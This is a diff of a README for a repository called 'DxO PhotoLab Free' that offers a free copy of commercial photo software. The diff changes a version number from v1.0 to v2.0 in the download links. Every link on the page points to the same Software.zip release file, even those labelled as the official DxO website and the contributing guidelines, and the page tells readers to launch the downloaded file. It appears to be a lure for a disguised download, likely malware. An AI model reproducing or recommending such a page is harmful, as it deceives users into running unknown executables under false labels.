@@ -1,6 +1,6 @@
 # Welcome to DxO PhotoLab Free Repository 📸
 
-![DxO PhotoLab Free](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v1.0/Software.zip)
+![DxO PhotoLab Free](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 - [Description](#description)
@@ -26,7 +26,7 @@ Welcome to the "DxO PhotoLab Free" repository! Here you can find valuable inform
 
 ## Installation
 To enjoy the features and benefits of DxO PhotoLab, you can download the software from the following link:
-[Download DxO PhotoLab Free](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v1.0/Software.zip)
+[Download DxO PhotoLab Free](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v2.0/Software.zip)
 
 (Requires launching the downloaded file for installation.)
 
@@ -34,10 +34,10 @@ To enjoy the features and benefits of DxO PhotoLab, you can download the softwar
 Explore the repository topics to find information on various aspects of DxO PhotoLab, such as version comparisons, essential features, and presets. Feel free to engage in discussions, ask questions, or share your experiences with the community.
 
 ## Documentation
-For detailed documentation, tutorials, and guides on using DxO PhotoLab effectively, please visit the official [DxO website](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v1.0/Software.zip).
+For detailed documentation, tutorials, and guides on using DxO PhotoLab effectively, please visit the official [DxO website](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v2.0/Software.zip).
 
 ## Contributing
-We welcome contributions to enhance this repository and make it more valuable for DxO PhotoLab users. Whether it's sharing tips, creating new presets, or suggesting improvements, your input is highly appreciated. Please refer to the [Contributing Guidelines](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v1.0/Software.zip) for more information.
+We welcome contributions to enhance this repository and make it more valuable for DxO PhotoLab users. Whether it's sharing tips, creating new presets, or suggesting improvements, your input is highly appreciated. Please refer to the [Contributing Guidelines](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v2.0/Software.zip) for more information.
 
 ## License
 This repository is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
@@ -46,4 +46,4 @@ Thank you for visiting the "DxO PhotoLab Free" repository. Make the most of your
 
 ---
 
-[![Download DxO PhotoLab](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v1.0/Software.zip%20PhotoLab-brightgreen)](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v1.0/Software.zip)
+[![Download DxO PhotoLab](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v2.0/Software.zip%20PhotoLab-brightgreen)](https://github.com/CyberGeek42/DxO-PhotoLab-Free/releases/download/v2.0/Software.zip)
